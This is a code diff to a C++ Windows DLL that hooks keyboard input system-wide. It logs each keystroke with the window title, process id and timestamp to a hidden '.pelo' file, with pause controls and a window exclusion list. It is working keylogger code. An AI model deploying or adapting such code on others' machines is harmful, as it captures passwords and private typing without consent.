@@ -6,18 +6,17 @@
 #include <fstream>
 #include <string>
 #include <atlstr.h>
-#include <vector>
-#include <regex>
+#include <time.h>
 
 #pragma data_seg(".sharedata")
 HHOOK hHook = 0;
 HANDLE hSharedMem = 0;
+HOOKPROC hHookProc = 0;
 int windowChangeCnt = 0;
 HWND hWnd = 0;
 #pragma data_seg()
-
 HINSTANCE hInst;
-WindowManager* window_manager;
+bool isHooking;
 
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
@@ -37,56 +36,15 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	return TRUE;
 }
 
-
 #pragma region Export DLL 
 extern "C" __declspec(dllexport) void init()
 {
 	initialize();
 }
 
-extern "C" __declspec(dllexport) void exit_key_log_info()
-{
-	delete window_manager;
-}
-
-extern "C" __declspec(dllexport) void print_win_title()
-{
-	window_manager->PrintWinTitle();
-}
-
-extern "C" __declspec(dllexport) void my_get_foreground_window()
+extern "C" __declspec(dllexport) void setWindowHandle()
 {
 	hWnd = GetForegroundWindow();
-	if (hWnd == NULL)
-	{
-		std::cout << "[!!!] fail to set Window handle." << std::endl;
-
-	}
-	else
-	{
-		std::cout << "[*] set Window handle." << std::endl;
-	}
-	char buf[100];
-	GetWindowTextA(hWnd, buf, 100);
-	window_manager->SetWinTitle(buf);
-	window_manager->SetWindowHandle(hWnd);
-}
-
-extern "C" __declspec(dllexport) void my_set_process_id()
-{
-	DWORD id;
-	GetWindowThreadProcessId(hWnd, &id);
-	window_manager->SetProcessId(id);
-}
-
-extern "C" __declspec(dllexport) DWORD get_process_id()
-{
-	return window_manager->GetProcessId();
-}
-
-extern "C" __declspec(dllexport) char* get_win_title()
-{
-	return window_manager->GetWinTitle();
 }
 
 
@@ -105,7 +63,8 @@ extern "C" __declspec(dllexport) void startHook(int m_maxKeyCnt)
 	}
 	initKeyLogInfo(info);
 
-	hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, hInst, 0);
+	hHookProc = (HOOKPROC)hookProc;
+	hHook = SetWindowsHookEx(WH_KEYBOARD, hHookProc, hInst, 0);
 
 	if (hHook == NULL)
 	{
@@ -113,8 +72,16 @@ extern "C" __declspec(dllexport) void startHook(int m_maxKeyCnt)
 		return;
 	}
 
+	isHooking = true;
 	std::cout << "[*] successfull, start hook." << std::endl;
 	return;
+}
+
+extern "C" __declspec(dllexport) bool pauseHook()
+{
+	isHooking = false;
+	hHookProc = NULL;
+	return UnhookWindowsHookEx(hHook);
 }
 
 extern "C" __declspec(dllexport) bool endHook()
@@ -128,19 +95,67 @@ extern "C" __declspec(dllexport) bool endHook()
 		CloseHandle(hSharedMem);
 	}
 	std::cout << "[*] finish keyboard hook." << std::endl;
+	isHooking = false;
 	return UnhookWindowsHookEx(hHook);
 }
 
-extern "C" __declspec(dllexport) void say(std::string str)
+extern "C" __declspec(dllexport) bool getHooking()
 {
-	std::cout << str << std::endl;
+	return isHooking;
+}
+
+
+extern "C" __declspec(dllexport) bool isCurrentWindowEnableHook()
+{
+	char check[128];
+	std::string path = "";
+	getDllPath(path);
+	path += "/unablehook.data";
+	std::ifstream ifs(path);
+	if (ifs.fail())
+	{
+		return false;
+	}
+
+	HWND hWndNow = GetForegroundWindow();
+	char winName[128];
+	GetWindowTextA(hWndNow, winName, 128);
+
+	// std::cout << "winName " << winName << std::endl;
+	while (ifs.getline(check, 128))
+	{
+		// std::cout << "check " << check << std::endl;
+		if (strstr(winName, check) != NULL) { return false; }
+	}
+	hWnd = hWndNow;
+	return true;
+}
+
+extern "C" __declspec(dllexport) int isChangeWindow()
+{
+	if (hWnd == GetForegroundWindow())
+	{
+		return 1;
+	}
+	else
+	{
+		return 0;
+	}
 }
 #pragma endregion
 
-
 void initialize()
 {
-	window_manager = new WindowManager();
+	hWnd = GetForegroundWindow();
+	if (hWnd == NULL)
+	{
+		std::cout << "[!!!] fail to set Window handle." << std::endl;
+	}
+	else
+	{
+		isHooking = false;
+		std::cout << "[*] set Window handle." << std::endl;
+	}
 }
 
 LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -165,8 +180,11 @@ LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)
 		else
 		{
 			keyLogInfo* info = getKeyLogSharedMemory(windowChangeCnt);
-			info->wp[info->keyCnt] = wParam;
-			info->keyCnt++;
+			if (MAX_KEY_COUNT > info->keyCnt)
+			{
+				info->wp[info->keyCnt] = wParam;
+				info->keyCnt++;
+			}
 		}
 	}
 	return CallNextHookEx(hHook, nCode, wParam, lParam);
@@ -224,6 +242,22 @@ void initKeyLogInfo(keyLogInfo *info)
 	GetWindowTextA(hWnd, info->title, TITLE_SIZE);
 	GetWindowThreadProcessId(hWnd, &info->pid);
 	info->keyCnt = 0;
+	time_t t = time(NULL);
+	struct tm tM;
+	errno_t err_t = localtime_s(&tM, &t);
+	/*if (err_t != NULL)
+	{*/
+		int year = tM.tm_year + 1900;
+		int mon = tM.tm_mon + 1;
+		int day = tM.tm_mday;
+		int hour = tM.tm_hour;
+		int min = tM.tm_min;
+		info->time[0] = tM.tm_year + 1900;
+		info->time[1] = tM.tm_mon + 1;
+		info->time[2] = tM.tm_mday;
+		info->time[3] = tM.tm_hour;
+		info->time[4] = tM.tm_min;
+	//}
 }
 
 void printKeyLog(int windowId)
@@ -234,6 +268,8 @@ void printKeyLog(int windowId)
 	{
 		std::cout << "NO." << windowId << " KEY LOG INFO WINDOW {" << std::endl;
 		std::cout << "  title: " << info->title << std::endl;
+		std::cout << "  time: " << info->time[0] << "." << info->time[1] << "." 
+			<< info->time[2] << " " << info->time[3] << ":" << info->time[4] << std::endl;
 		std::cout << "  pid: " << info->pid << std::endl;
 		std::cout << "  keyCnt: " << info->keyCnt << std::endl;
 		std::string key_log = "";
@@ -252,21 +288,9 @@ void printKeyLog(int windowId)
 void writeKeyLog(int windowId)
 {
 	std::ofstream outputfile;
-	char path[MAX_PATH];
-	int size = sizeof(path) / sizeof(path[0]);
-	GetModuleFileNameA(hInst, path, size);
 	std::string path_str = "";
-	for (int i = 0; i < size; i++)
-	{
-		path_str += path[i];
-	}
-	int pos = path_str.rfind("dll");
-	path_str = path_str.substr(0, pos);
-	pos = path_str.rfind("\\");
-	path_str = path_str.substr(0, pos);
-	std::cout << "path_str " << path_str << std::endl;
+	getDllPath(path_str);
 	path_str += "/.pelo";
-
 
 	outputfile.open(path_str, std::ios::app);
 	keyLogInfo* info = getKeyLogSharedMemory(windowId);
@@ -275,6 +299,8 @@ void writeKeyLog(int windowId)
 	{
 		outputfile << "NO." << windowId << " KEY LOG INFO WINDOW {" << std::endl;
 		outputfile << "  title: " << info->title << std::endl;
+		outputfile << "  time: " << info->time[0] << "." << info->time[1] << "."
+			<< info->time[2] << " " << info->time[3] << ":" << info->time[4] << std::endl;
 		outputfile << "  pid: " << info->pid << std::endl;
 		outputfile << "  keyCnt: " << info->keyCnt << std::endl;
 		std::string key_log = "";
@@ -291,12 +317,11 @@ void writeKeyLog(int windowId)
 	delete tracer;
 }
 
-void getDllPath()
+void getDllPath(std::string &path_str)
 {
 	char path[MAX_PATH];
 	int size = sizeof(path) / sizeof(path[0]);
 	GetModuleFileNameA(hInst, path, size);
-	std::string path_str = "";
 	for (int i = 0; i < size; i++)
 	{
 		path_str += path[i];
@@ -305,10 +330,7 @@ void getDllPath()
 	path_str = path_str.substr(0, pos);
 	pos = path_str.rfind("\\");
 	path_str = path_str.substr(0, pos);
-	std::cout << "path_str " << path_str << std::endl;
-	//return path_str;
 }
-
 
 void refreshKeyLogSharedMemory(keyLogInfo* info)
 {
